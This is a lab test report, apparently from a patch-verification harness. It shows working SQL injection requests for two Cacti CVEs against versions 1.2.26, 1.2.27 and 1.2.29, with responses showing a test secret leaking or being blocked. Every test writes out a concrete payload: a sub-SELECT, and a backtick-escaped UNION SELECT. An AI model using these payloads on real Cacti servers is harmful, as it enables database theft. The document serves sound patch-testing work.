## 4-Way Differential Results (PCB_FLAG=PCBFLAG_test_d41b0f2837e94b79)

### Test 1: Seed (CVE-2024-31460) on V0 (1.2.26) — REACHES FLAG
Request: GET /pcb_probe.php?action=run&item_field=(SELECT+secret+FROM+pcb_secrets+LIMIT+1)&m_field=hostname&m_operation=0&m_operator=1&m_pattern=local
Result: {"ver":"1.2.26","stored":{"item_field":"(SELECT secret FROM pcb_secrets LIMIT 1)","m_field":"hostname","match_stored":true,"store_rejected":false},"rows":[{"host_id":99,"hostname":"localhost-monitor","description":"PCB monitored device","disabled":"","status":3,"host_template_name":null,"source":"PCBFLAG_test_d41b0f2837e94b79"}]}
Observation: Flag appears in rows[0].source — the sub-SELECT in the tree-rule item field runs in the SELECT-list and surfaces pcb_secrets.secret.

### Test 2: Seed (CVE-2024-31460) on V1 (1.2.27) — BLOCKED
Request: GET /pcb_probe.php?action=run&item_field=(SELECT+secret+FROM+pcb_secrets+LIMIT+1)&m_field=hostname&m_operation=0&m_operator=1&m_pattern=local
Result: {"ver":"1.2.27","stored":{"item_field":"(SELECT secret FROM pcb_secrets LIMIT 1)","m_field":"hostname","match_stored":true,"store_rejected":false},"rows":[{"host_id":99,"hostname":"localhost-monitor","description":"PCB monitored device","disabled":"","status":3,"host_template_name":null,"source":"SQL Injection"}]}
Observation: api_automation_column_exists() (added by CVE-2024-31460 fix) rejects the non-column field; source replaced with literal "SQL Injection" — flag NOT present.

### Test 3: Residual (CVE-2025-24368) on V1 (1.2.27) — REACHES FLAG
Request: GET /pcb_probe.php?action=run&item_field=hostname&m_field=hostname`='zzz') UNION SELECT 1,2,(SELECT secret FROM pcb_secrets LIMIT 1),4,5,6,7-- &m_operation=0&m_operator=0&m_pattern=
Result: {"ver":"1.2.27","stored":{"item_field":"hostname","m_field":"hostname`='zzz') UNION SELECT 1,2,(SELECT secret FROM pcb_secrets LIMIT 1),4,5,6,7-- ","match_stored":true,"store_rejected":false},"rows":[{"host_id":"1","hostname":"2","description":"PCBFLAG_test_d41b0f2837e94b79","disabled":"4","status":"5","host_template_name":"6","source":"7"}]}
Observation: Match rule item field stored without validation (no store guard on V1). build_rule_item_filter() injects the backtick-escaped field raw into the WHERE clause; UNION SELECT surfaces pcb_secrets.secret in description (col 3 of the 7-col query). Flag present.

### Test 4: Residual (CVE-2025-24368) on V2 (1.2.29) — BLOCKED
Request: GET /pcb_probe.php?action=run&item_field=hostname&m_field=hostname`='zzz') UNION SELECT 1,2,(SELECT secret FROM pcb_secrets LIMIT 1),4,5,6,7-- &m_operation=0&m_operator=0&m_pattern=
Result: {"ver":"1.2.29","stored":{"item_field":"hostname","m_field":"hostname`='zzz') UNION SELECT 1,2,(SELECT secret FROM pcb_secrets LIMIT 1),4,5,6,7-- ","match_stored":false,"store_rejected":true},"rows":[]}
Observation: V2 store guard (db_column_exists check, same as automation_tree_rules.php::form_save) rejects the non-column field before INSERT — match rule item never persisted. Query returns empty (WHERE = (1 != 1)). Flag NOT present.

